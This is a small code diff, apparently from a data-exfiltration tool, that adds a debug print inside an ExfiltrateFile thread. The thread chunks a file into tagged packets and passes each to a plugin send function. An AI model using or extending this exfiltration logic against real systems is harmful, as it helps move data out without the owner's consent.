@@ -273,6 +273,7 @@ class ExfiltrateFile(threading.Thread):
             # info("Sending %s bytes packet" % len(data_file))
 
             data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
+            print data
             plugin_send_function(data)
             packet_index = packet_index + 1
 
